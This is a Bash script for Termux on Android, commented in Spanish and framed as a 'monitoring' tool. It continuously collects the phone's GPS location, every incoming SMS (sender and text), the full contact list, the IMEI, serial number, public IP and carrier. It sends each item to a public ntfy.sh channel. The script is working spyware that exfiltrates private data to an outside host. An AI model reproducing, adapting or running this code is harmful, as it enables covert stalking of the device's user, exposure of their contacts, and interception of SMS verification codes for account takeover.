#!/bin/bash
# Script de Monitoreo Completo para Termux - Versión Corregida
# Incluye todas las funciones originales con mejoras de estabilidad

# ===== CONFIGURACIÓN =====
NTFY_URL="https://ntfy.sh/3kG4epWMkei6KLLq"  # REEMPLAZAR CON TU CANAL
INTERVALO_PRINCIPAL=300    # 5 minutos para recolección completa
INTERVALO_UBICACION=60     # 1 minuto para actualizar ubicación
INTERVALO_SMS=2            # 2 segundos para verificar nuevos SMS
MAX_PARALLEL=4             # Máximo de procesos concurrentes
DEBUG=true                 # Mostrar mensajes de depuración

# ===== INICIALIZACIÓN =====
cleanup() {
    echo "Limpiando y terminando..."
    kill $(jobs -p) 2>/dev/null
    exit 0
}
trap cleanup EXIT TERM INT

# Directorios de trabajo
mkdir -p "$HOME/.monitoreo_termux"
SMS_LAST_ID_FILE="$HOME/.monitoreo_termux/ultimo_sms_id"

# ===== INSTALAR DEPENDENCIAS =====
instalar_dependencias() {
    for pkg in termux-api jq iproute2 curl; do
        if ! command -v $pkg >/dev/null 2>&1; then
            echo "Instalando $pkg..."
            pkg install -y $pkg || {
                echo "Error al instalar $pkg" >&2
                exit 1
            }
        fi
    done
}

# ===== FUNCIÓN DE ENVÍO MEJORADA =====
enviar_ntfy() {
    local mensaje="$1"
    [ -z "$mensaje" ] && return
    
    # Control de procesos paralelos
    while [ $(jobs -r | wc -l) -ge $MAX_PARALLEL ]; do
        sleep 0.1
    done
    
    if curl -sS -m 15 \
        -H "Priority: high" \
        -H "Tags: warning" \
        -d "$mensaje" \
        "$NTFY_URL" >/dev/null 2>&1; then
        [ "$DEBUG" = true ] && echo "✔ Mensaje enviado correctamente a NTFY"
        return 0
    else
        echo "⚠ Error al enviar mensaje a NTFY (¿Conexión o URL incorrecta?)" >&2
        return 1
    fi
}

# ===== VERIFICAR PERMISOS MEJORADO =====
verificar_permisos() {
    local problemas=0
    
    declare -A comandos=(
        ["ubicación"]="termux-location -h"
        ["SMS"]="termux-sms-list -h"
        ["contactos"]="termux-contact-list -h"
        ["llamadas"]="termux-call-log -h"
    )

    for permiso in "${!comandos[@]}"; do
        if timeout 5 ${comandos[$permiso]} 2>&1 | grep -q "permission"; then
            echo "✖ Permiso de $permiso: DENEGADO" >&2
            problemas=$((problemas+1))
        else
            echo "✔ Permiso de $permiso: CONCEDIDO"
        fi
    done

    if [ $problemas -eq 0 ]; then
        enviar_ntfy "✅ Todos los permisos están concedidos"
        return 0
    else
        enviar_ntfy "🔴 Error: Faltan $problemas permisos necesarios"
        return 1
    fi
}

# ===== OBTENER UBICACIÓN CONFIABLE =====
obtener_ubicacion() {
    local intentos=3
    local ubicacion
    
    while [ $intentos -gt 0 ]; do
        ubicacion=$(timeout 20 termux-location -p gps 2>/dev/null)
        [ -z "$ubicacion" ] && ubicacion=$(timeout 15 termux-location -p network 2>/dev/null)
        
        if [ -n "$ubicacion" ]; then
            local lat=$(echo "$ubicacion" | jq -r '.latitude // empty')
            local lon=$(echo "$ubicacion" | jq -r '.longitude // empty')
            local prec=$(echo "$ubicacion" | jq -r '.accuracy // "N/A"')
            
            if [ -n "$lat" ] && [ -n "$lon" ]; then
                enviar_ntfy "📍 Ubicación Obtenida
Latitud: $lat
Longitud: $lon
Precisión: $prec metros
🗺️ https://maps.google.com?q=$lat,$lon"
                return 0
            fi
        fi
        
        intentos=$((intentos-1))
        sleep 5
    done
    
    enviar_ntfy "⚠️ No se pudo obtener la ubicación"
    return 1
}

# ===== MONITOR DE SMS EN TIEMPO REAL =====
monitor_sms() {
    [ -f "$SMS_LAST_ID_FILE" ] || echo "0" > "$SMS_LAST_ID_FILE"
    local ultimo_id=$(cat "$SMS_LAST_ID_FILE")
    
    while true; do
        local nuevos_sms=$(timeout 5 termux-sms-list -l 1 2>/dev/null)
        local id_actual=$(echo "$nuevos_sms" | jq -r '.[0]._id // empty')
        
        if [ -n "$id_actual" ] && [ "$id_actual" != "$ultimo_id" ]; then
            local remitente=$(echo "$nuevos_sms" | jq -r '.[0].sender // "Desconocido"')
            local contenido=$(echo "$nuevos_sms" | jq -r '.[0].body // ""' | head -c 500)
            
            enviar_ntfy "📩 Nuevo SMS
De: $remitente
Contenido: $contenido"
            
            echo "$id_actual" > "$SMS_LAST_ID_FILE"
            ultimo_id="$id_actual"
        fi
        
        sleep $INTERVALO_SMS
    done
}

# ===== OBTENER CONTACTOS =====
obtener_contactos() {
    local contactos=$(timeout 60 termux-contact-list 2>/dev/null)
    
    if [ -n "$contactos" ]; then
        local total=$(echo "$contactos" | jq -r 'length')
        enviar_ntfy "📚 Contactos ($total)"
        
        echo "$contactos" | jq -c '.[]' | while read -r contacto; do
            local nombre=$(echo "$contacto" | jq -r '.name // "Sin nombre"')
            local numero=$(echo "$contacto" | jq -r '.number // "Sin número"')
            local email=$(echo "$contacto" | jq -r '.email // "Sin email"')
            
            enviar_ntfy "👤 $nombre
Tel: $numero
Email: $email"
            sleep 0.5
        done
    else
        enviar_ntfy "⚠️ No se pudieron obtener contactos"
    fi
}

# ===== OBTENER IP LOCAL MEJORADO =====
obtener_ip_local() {
    if command -v ip >/dev/null; then
        ip route get 1 | awk '{print $7}' | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' || echo "No disponible"
    else
        ifconfig | grep -oE 'inet (addr:)?([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v '127.0.0.1' | cut -d' ' -f2 || echo "No disponible"
    fi
}

# ===== INFORMACIÓN DE RED =====
obtener_info_red() {
    local ip_publica=$(timeout 10 curl -sS ifconfig.me)
    local sim_info=$(timeout 10 termux-telephony-deviceinfo 2>/dev/null)
    local operador=$(echo "$sim_info" | jq -r '.carrier // "Desconocido"')
    local imei=$(echo "$sim_info" | jq -r '.device_id // "No disponible"')
    
    enviar_ntfy "🌐 Red
IP Pública: ${ip_publica:-No disponible}
Operador: $operador
IMEI: $imei"
}

# ===== INFORMACIÓN DEL DISPOSITIVO =====
obtener_info_dispositivo() {
    local modelo=$(getprop ro.product.model)
    local serial=$(getprop ro.serialno || echo "No disponible")
    local fabricante=$(getprop ro.product.manufacturer)
    local android=$(getprop ro.build.version.release)
    
    local bateria=$(timeout 10 termux-battery-status 2>/dev/null)
    local nivel=$(echo "$bateria" | jq -r '.percentage // "N/A"')
    local estado=$(echo "$bateria" | jq -r '.status // "Desconocido"')
    local temp=$(echo "$bateria" | jq -r '.temperature | tonumber/10 | tostring + "°C" // "N/A"')
    
    case $estado in
        "CHARGING") estado="🔌 Cargando" ;;
        "DISCHARGING") estado="🔋 Descargando" ;;
        "FULL") estado="✅ Completa" ;;
        *) estado="� $estado" ;;
    esac
    
    enviar_ntfy "📱 Dispositivo
Modelo: $modelo
Serie: $serial
Fabricante: $fabricante
Android: $android
Batería: $nivel% ($estado)
Temp: $temp"
}

# ===== EJECUCIÓN PRINCIPAL =====
main() {
    instalar_dependencias
    
    if ! verificar_permisos; then
        exit 1
    fi

    enviar_ntfy "🚀 Iniciando monitoreo - $(date '+%d/%m/%Y %H:%M:%S')"

    monitor_sms &
    
    while true; do
        local inicio=$(date +%s)
        
        obtener_info_dispositivo
        obtener_info_red
        obtener_ubicacion
        obtener_contactos
        
        local duracion=$(( $(date +%s) - inicio ))
        local espera=$(( INTERVALO_PRINCIPAL - duracion ))
        
        [ $espera -gt 0 ] && sleep $espera || sleep 10
    done
}

main
